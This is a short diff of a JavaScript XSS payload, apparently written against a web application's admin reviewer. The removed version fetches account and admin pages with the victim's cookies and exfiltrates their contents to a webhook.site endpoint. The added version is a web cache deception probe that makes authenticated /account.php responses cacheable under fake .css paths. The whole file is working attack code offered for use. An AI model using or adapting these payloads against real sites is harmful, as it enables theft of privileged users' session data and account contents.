@@ -1,10 +1,9 @@
 (function(){
-  var WH = 'https://webhook.site/33c5dba2-b36b-4100-a129-27f83ff82701';
-  function exfil(d,l){var i=new Image();i.src=WH+'?l='+encodeURIComponent(l)+'&d='+encodeURIComponent(d.substring(0,4000))}
-  var pages = ['/account.php','/admin/','/admin/review.php','/admin/search.php'];
-  for(var i=0;i<pages.length;i++){
-    (function(p){
-      fetch(p,{credentials:'include'}).then(function(r){return r.text()}).then(function(t){exfil(t,p)}).catch(function(e){exfil(e.message,'err_'+p)})
-    })(pages[i]);
-  }
+  // TEST: si ce JS s'exécute, le reviewer fetch /account.php/EXECUTED_31337.css
+  // -> sera mis en cache (cache deception) -> on le lira
+  var t = new Date().getTime();
+  try { fetch('/account.php/EXECUTED_' + t + '.css', {credentials:'include'}); } catch(e) {}
+  try { var img = new Image(); img.src = '/account.php/EXECUTED_IMG_' + t + '.css'; } catch(e) {}
+  // marqueur fixe pour vérification facile
+  try { fetch('/account.php/EXECUTED_31337.css', {credentials:'include'}); } catch(e) {}
 })();
